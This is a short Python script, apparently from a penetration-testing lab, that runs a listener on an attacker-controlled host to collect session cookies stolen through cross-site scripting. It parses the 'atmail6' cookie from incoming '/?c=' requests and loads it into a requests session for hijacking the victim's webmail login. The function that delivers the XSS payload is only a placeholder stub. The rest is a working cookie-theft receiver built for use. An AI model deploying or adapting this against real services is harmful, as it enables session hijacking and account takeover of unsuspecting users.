import threading
import requests
from http.server import HTTPServer
from http.server import SimpleHTTPRequestHandler
from http.cookies import SimpleCookie
import subprocess
from rich.console import Console

# Configuration update this to tun0
LHOST = "192.168.45.156"
WEB_PORT = 80
console = Console()

# Global session for requests
session = requests.Session()
xss_event = threading.Event()  # Signifies when victim sends their cookie

def send_xss_payload():
    """
    Function to simulate sending an XSS payload.
    Replace this with the actual payload delivery mechanism.
    """
    print("[+] XSS payload sent to the target.")

def start_web_server():
    """
    Starts a web server to receive stolen cookies.
    """
    class MyHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            global session
            try:
                # Respond to the victim
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"XSS Listener: Cookie received!")

                # Extract stolen cookie
                if "/?c=" in self.path:
                    _, enc_cookie = self.path.split("/?c=", 1)
                    php_session_id = SimpleCookie(enc_cookie)["atmail6"].value # update this to the cookie that you're stealing
                    session.cookies["atmail6"] = php_session_id

                    # Log the cookie
                    console.log(f"[yellow][!] Received and decoded cookie: {php_session_id}")
                    xss_event.set()  # Trigger the event
                else:
                    console.log(f"[red][-] No cookie found in the request.")
            except Exception as e:
                console.log(f"[red][-] Error processing request: {e}")

    # Start the HTTP server in a new thread
    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    print(f"[+] Web server started at http://{LHOST}:{WEB_PORT}")

# Main execution flow
start_web_server()
send_xss_payload()
xss_event.wait()  # Wait for event to be triggered
console.log(f"[green][+] Stolen cookie in the session object:", session.cookies.get("atmail6"))
